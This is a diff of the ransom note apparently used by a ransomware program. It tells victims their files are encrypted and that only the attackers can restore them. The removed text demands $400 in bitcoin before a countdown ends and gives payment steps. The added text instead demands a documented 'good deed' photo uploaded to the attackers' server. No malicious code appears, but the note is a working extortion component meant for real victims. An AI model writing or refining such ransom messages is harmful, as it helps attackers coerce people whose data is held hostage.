@@ -3,26 +3,28 @@ your important files have been encrypted using a millitary grade AES algorithm.
 Many of your documents, photos, videos, databases and other files are no longer 
 accesible because they have been encrypted.
 Maybe you are looking for a way to recover your files but do not waste your time.
-Nobody, not your cousin, not your son   who "Works in hightech" and not the 
+Nobody, not your cousin, not your son who "Works in hightech" and not the 
 computer repair guy. Nobody can recover your 
 important documents other than our decryption service.
 
+Why are we doing this?
+We are all aware of the fact that thousands of people die and suffer
+because they don't have enough money. We want to make the world a better place.
+For you it might be just a couple bucks, or maybe a few minutes of your time,
+but for the other person it could mean the world.
+All we want for you is to do a good deed, and your files will return to you.
+A good deed can be: paying for someone at the grocery store, buying a homeless
+man some clothes and food, helping an old lady cross the street with her groceries.
+As long as it can be documented with an image.
+
 Can I recover my files?
 Sure you can. We gurantee you can recover all your files safely and easily.
-But, you don't have alot of time...
-You have until the timer on the left side of the screen finishes to pay the ransom.
-Once you send 400$ worth of bitcoin to the address on the bottom of the screen,
-your files will be safely returned to you,
+In order to recover your files you need to upload an image through
+the button at the bottom of the screen to the server.
+After you uploaded the files it will be checked by our team of
+experts, who will make sure your image is valid. When your image
+has been approved, your files will be safely returned to you,
 and Our software will erase itself from your computer forever!
 
-How do I pay?
-Payment will be recived only in bitcoin. Any other form of payment is NOT accepted.
-If you wish to get your files back you should go buy bitcoin right now.
-Buying bitcoin is easy and can be done through a number of online services available for you
-all over the internet. Sites like Coinbase, Binance and more offer bitcoin purcheses with credit card.
-Once you have transffered the bitcoin to the address you should get a transaction ID with your transfer.
-Input the transaction ID to the specified box and click "Check Payment".
-If your payment was succesfull, you files will be decrypted.
-The transaction ID is case sensitive and if it has any spaces in it won't work.
 
 GOOD LUCK
